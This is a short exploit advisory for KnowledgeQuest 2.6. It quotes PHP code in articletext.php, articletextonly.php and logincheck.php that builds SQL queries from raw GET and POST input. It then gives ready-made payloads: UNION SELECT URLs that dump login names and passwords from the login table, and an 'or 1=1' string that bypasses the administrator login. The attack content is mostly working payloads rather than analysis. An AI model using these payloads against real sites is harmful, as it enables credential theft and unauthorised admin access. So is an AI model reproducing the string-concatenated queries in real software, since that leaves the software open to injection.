KnowledgeQuest 2.6 SQL Injection Vulnerabilities
================================================



             ########################################################################
             #                                                                      #
             #    ...:::::KnowledgeQuest 2.6 SQL Injection Vulnerabilities ::::.... #           
             ########################################################################


--------
Discoverd By :virangar security team(hadihadi)

special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra

greetz:to my best friend in the world hadi_aryaie2004
& my lovely friend arash(imm02tal) from emperor team :)
-------
vuln code in articletext.php:
line 13: $kqid = $HTTP_GET_VARS["kqid"];
......
line 17: $result = mysql_query("select DATE_FORMAT(postdate,&#039;%m-%d-%y&#039;) as  postdate, DATE_FORMAT(reveiwdate,&#039;%m-%d-%y&#039;) as reveiwdate, categoryid,title,text, attach, kqid, authorid from knowledgebase where kqid=" .$kqid.mysql_error());
###########
vuln code in articletextonly.php:
line 13: $kqid = $HTTP_GET_VARS["kqid"];
......
line 17:$result = mysql_query("select * from knowledgebase where kqid=" .$kqid.mysql_error());
--------
Exploits:
http://www.site.com/[patch]/articletextonly.php?kqid=-9999/**/union/**/select/**/1,2,3,loginid,password,6,7,8,9,10,11/**/from/**/login/*
http://www.site.com/[patch]/articletext.php?kqid=-999/**/union/**/select/**/1,2,3,loginid,password,6,7,8/**/from/**/login/*
--------------------------------
                                .::::admin Authentication bypass vuln::::.
vuln code in logincheck.php:
if(!empty($_POST[&#039;username&#039;]))
    {
        $username = $_POST[&#039;username&#039;];
    }

    if(!empty($_POST[&#039;password&#039;]))
    {
        $password = $_POST[&#039;password&#039;];
    }
...
...
...
$sql = "select * from login where loginid=&#039;". $username ."&#039; and password=&#039;". $password . "&#039;";
-----
Exploit:
User Name:admin &#039; or 1=1/*
Password :[whatever]
//you must login in administratorlogin.php ;)
--------------



